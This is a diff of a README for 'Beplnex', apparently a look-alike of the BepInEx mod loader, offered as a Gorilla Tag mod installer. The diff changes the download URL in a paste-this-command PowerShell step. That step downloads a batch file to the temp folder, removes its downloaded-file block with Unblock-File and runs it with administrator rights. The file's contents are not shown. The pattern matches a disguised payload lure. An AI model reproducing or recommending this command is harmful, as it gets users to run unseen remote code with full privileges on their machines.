@@ -39,7 +39,7 @@ Linux: Supported
 
 5. [PowerShell Installation](https://github.com/DerpVar/Beplnex-Gorilla-Tag/blob/main/Beplnex.bat)
 ```bash
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TahoeGitCo/Gorilla-Tag-PowerShell/main/Beplnex.bat" -OutFile "$env:TEMP\Beplnex.bat"
+Invoke-WebRequest -Uri "https://github.com/DerpVar/Beplnex-Gorilla-Tag/blob/main/Beplnex.bat" -OutFile "$env:TEMP\Beplnex.bat"
 Unblock-File "$env:TEMP\Beplnex.bat"
 Start-Process -FilePath "$env:TEMP\Beplnex.bat" -Verb RunAs -WorkingDirectory $env:TEMP
 ```
